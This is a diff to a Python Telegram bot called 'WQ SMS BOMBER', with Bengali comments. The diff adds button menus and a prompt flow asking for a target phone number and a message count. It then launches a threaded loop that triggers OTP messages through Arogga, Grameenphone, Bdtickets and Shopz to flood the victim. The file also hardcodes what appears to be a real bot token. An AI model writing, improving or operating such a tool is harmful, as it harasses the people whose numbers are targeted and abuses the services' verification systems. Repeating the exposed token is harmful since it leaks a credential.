@@ -1,4 +1,3 @@
-
 import os
 import random
 import threading
@@ -6,6 +5,7 @@ import time
 from flask import Flask
 import requests
 import telebot
+from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
 
 # আপনার দেওয়া টেলিগ্রাম বট টোকেন
 TOKEN = "9170879282:AAESbi5FBohsHoVvrs4t-kblWKfULticg4s"
@@ -13,6 +13,9 @@ bot = telebot.TeleBot(TOKEN)
 
 # রেন্ডারের পোর্ট রিকোয়ারমেন্ট পূরণের জন্য ফ্লাস্ক ওয়েব সার্ভার
 app = Flask(__name__)
+
+# ইউজারদের সাময়িক ডাটা ধরে রাখার জন্য ডিকশনারি (যেমন: টার্গেট নম্বর ও কাউন্ট)
+user_sessions = {}
 
 
 @app.route("/")
@@ -167,8 +170,9 @@ class Bomber:
     counter = 0
     bot.send_message(
         self.chat_id,
-        f"🚀 Target: {self.user_mobile} | Count: {self.number_of_messege}\nকাজ"
-        " শুরু হচ্ছে...",
+        f"🚀 **Target:** `{self.user_mobile}`\n📊 **Count:**"
+        f" `{self.number_of_messege}`\n⚡ **বম্বিং কার্যক্রম শুরু হয়েছে...**",
+        parse_mode="Markdown",
     )
     methods = [self.aroggo, self.grameenphone, self.bdtickets, self.shopz]
 
@@ -182,7 +186,7 @@ class Bomber:
         try:
           success = method()
           if success:
-            counter +=1
+            counter += 1
             bot.send_message(
                 self.chat_id,
                 f"[+] OTP sent successfully! [{counter}/{self.number_of_messege}]",
@@ -194,21 +198,139 @@ class Bomber:
           time.sleep(1)
 
     bot.send_message(
-        self.chat_id, f"✅ Target {self.user_mobile} completed successfully!"
+        self.chat_id,
+        f"✅ **টাস্ক সম্পন্ন!**\nTarget: `{self.user_mobile}` সফলভাবে শেষ হয়েছে।",
+        parse_mode="Markdown",
     )
+
+
+# মূল মেনু বাটন জেনারেটর
+def get_main_keyboard():
+  keyboard = InlineKeyboardMarkup(row_width=2)
+  btn_bomb = InlineKeyboardButton(
+      "🚀 Start Bombing", callback_data="menu_bomb"
+  )
+  btn_status = InlineKeyboardButton("📊 Bot Status", callback_data="menu_status")
+  btn_help = InlineKeyboardButton("ℹ️ Help & Info", callback_data="menu_help")
+  btn_dev = InlineKeyboardButton("👑 Oustad Panel", callback_data="menu_dev")
+  keyboard.add(btn_bomb, btn_status, btn_help, btn_dev)
+  return keyboard
 
 
 # টেলিগ্রাম বট হ্যান্ডলার
 @bot.message_handler(commands=["start"])
 def send_welcome(message):
-  bot.reply_to(
-      message,
-      "স্বাগতম ওস্তাদ! 🚀\nবম্বিং শুরু করতে এই ফরম্যাটে মেসেজ দিন:\n`/bomb <number>"
-      " <count>`\nউদাহরণ: `/bomb 01312933000 10`",
+  welcome_text = (
+      "🔥 *স্বাগতম ওস্তাদ! WQ SMS BOMBER প্যানেলে.*\n\nনিচের সুন্দর ইন্টারঅ্যাক্টিভ"
+      " বাটনগুলো ব্যবহার করে খুব সহজেই বম্বিং কন্ট্রোল করুন:"
+  )
+  bot.send_message(
+      message.chat.id,
+      welcome_text,
+      reply_markup=get_main_keyboard(),
       parse_mode="Markdown",
   )
 
 
+# ইনলাইন বাটন ক্লিক হ্যান্ডলার
+@bot.callback_query_handler(func=lambda call: True)
+def callback_query(call):
+  chat_id = call.message.chat.id
+
+  if call.data == "menu_bomb":
+    msg = bot.send_message(
+        chat_id,
+        "📱 অনুগ্রহ করে টার্গেট মোবাইল নম্বরটি দিন (যেমন: `017xxxxxxxx`):",
+        parse_mode="Markdown",
+    )
+    bot.register_next_step_handler(msg, process_mobile_step)
+
+  elif call.data == "menu_status":
+    markup = InlineKeyboardMarkup()
+    markup.add(
+        InlineKeyboardButton("🔙 Main Menu", callback_data="back_home")
+    )
+    bot.edit_message_text(
+        "🟢 **Bot Status:** Online & Active\n🚀 **APIs Loaded:** Arogga,"
+        " Grameenphone, Bdtickets, Shopz\n⚡ **Speed:** High Performance",
+        chat_id,
+        call.message.message_id,
+        reply_markup=markup,
+        parse_mode="Markdown",
+    )
+
+  elif call.data == "menu_help":
+    markup = InlineKeyboardMarkup()
+    markup.add(
+        InlineKeyboardButton("🔙 Main Menu", callback_data="back_home")
+    )
+    bot.edit_message_text(
+        "ℹ️ **কীভাবে ব্যবহার করবেন:**\n\n১. `Start Bombing` বাটনে ক্লিক"
+        " করুন।\n২. টার্গেট নম্বর দিন।\n৩. কতটি মেসেজ পাঠাবেন তা লিখুন।\n\nঅথবা"
+        " ডিরেক্ট কমান্ড দিতে পারেন:\n`/bomb <number> <count>`",
+        chat_id,
+        call.message.message_id,
+        reply_markup=markup,
+        parse_mode="Markdown",
+    )
+
+  elif call.data == "menu_dev":
+    markup = InlineKeyboardMarkup()
+    markup.add(
+        InlineKeyboardButton("🔙 Main Menu", callback_data="back_home")
+    )
+    bot.edit_message_text(
+        "👑 **Developer:** Ruhin Ahmed (ওস্তাদ)\n⚡ **Brand:** GRAPIXY HUB\n🌐"
+        " **Hosted on:**  & GitHub",
+        chat_id,
+        call.message.message_id,
+        reply_markup=markup,
+        parse_mode="Markdown",
+    )
+
+  elif call.data == "back_home":
+    bot.edit_message_text(
+        "🔥 *স্বাগতম ওস্তাদ! WQ SMS BOMBER প্যানেলে.*\n\nনিচের সুন্দর ইন্টারঅ্যাক্টিভ"
+        " বাটনগুলো ব্যবহার করে খুব সহজেই বম্বিং কন্ট্রোল করুন:",
+        chat_id,
+        call.message.message_id,
+        reply_markup=get_main_keyboard(),
+        parse_mode="Markdown",
+    )
+
+
+# নম্বর পাওয়ার পর কাউন্ট চাওয়ার স্টেপ
+def process_mobile_step(message):
+  target_mobile = message.text.strip()
+  msg = bot.send_message(
+      message.chat.id,
+      f"✅ টার্গেট নম্বর: `{target_mobile}`\n\n🔢 এবার কতগুলো মেসেজ পাঠাতে চান তা"
+      " সংখ্যায় লিখুন (যেমন: `10`):",
+      parse_mode="Markdown",
+  )
+  bot.register_next_step_handler(msg, process_count_step, target_mobile)
+
+
+# কাউন্ট পাওয়ার পর বম্বিং শুরু করার স্টেপ
+def process_count_step(message, target_mobile):
+  try:
+    count = int(message.text.strip())
+    bot.send_message(
+        message.chat.id,
+        f"🚀 টাস্ক রিসিভড!\nTarget: `{target_mobile}`\nCount: `{count}`",
+        parse_mode="Markdown",
+    )
+    b = Bomber(target_mobile, count, message.chat.id)
+    threading.Thread(target=b.start).start()
+  except ValueError:
+    bot.send_message(
+        message.chat.id,
+        "[-] ভুল সংখ্যা দিয়েছেন! দয়া করে সঠিক সংখ্যা লিখুন। প্রক্রিয়াটি"
+        " বাতিল করা হলো।",
+    )
+
+
+# পুরনো /bomb কমান্ড সাপোর্টও বহাল রাখা হলো
 @bot.message_handler(commands=["bomb"])
 def handle_bomb(message):
   try:
@@ -223,7 +345,6 @@ def handle_bomb(message):
     target = parts[1]
     count = int(parts[2])
 
-    # ব্যাকগ্রাউন্ড থ্রেডে বম্বিং টাস্ক রান করানো যাতে বট হ্যাং না হয়ে যায়
     b = Bomber(target, count, message.chat.id)
     threading.Thread(target=b.start).start()
   except ValueError:
@@ -238,6 +359,6 @@ if __name__ == "__main__":
   # ব্যাকগ্রাউন্ডে টেলিগ্রাম বট চালু রাখা
   threading.Thread(target=run_telegram_bot, daemon=True).start()
 
-  # রেন্ডার সার্ভারের জন্য ডাইনামিক পোর্ট বাইন্ডিং
+  # রেন্ডারের সার্ভারের জন্য ডাইনামিক পোর্ট বাইন্ডিং
   port = int(os.environ.get("PORT", 5000))
   app.run(host="0.0.0.0", port=port)
